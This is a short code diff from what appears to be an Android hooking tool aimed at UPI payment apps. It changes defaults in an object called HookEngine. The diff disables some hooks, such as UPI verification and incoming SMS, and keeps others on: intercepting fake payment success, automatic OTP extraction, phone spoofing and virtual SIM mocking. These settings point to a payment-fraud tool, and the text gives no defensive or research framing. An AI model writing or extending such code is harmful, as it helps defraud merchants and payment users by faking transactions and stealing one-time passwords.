@@ -90,13 +90,13 @@ object HookEngine {
 
         val updated = current.copy(
             hookedUpiApps = selection,
-            hookUpiVerification = true,
-            hookIncomingSms = true,
+            hookUpiVerification = false,
+            hookIncomingSms = false,
             hookOutgoingSms = true,
             interceptFakeSuccess = true,
             autoExtractOtp = true,
             autoHookForeground = true,
-            overrideIncomingSender = hasSenderId || current.overrideIncomingSender,
+            overrideIncomingSender = false,
             enablePhoneSpoof = mockOn,
             enableSim1Mock = mockOn,
             enableVirtualSim = mockOn,
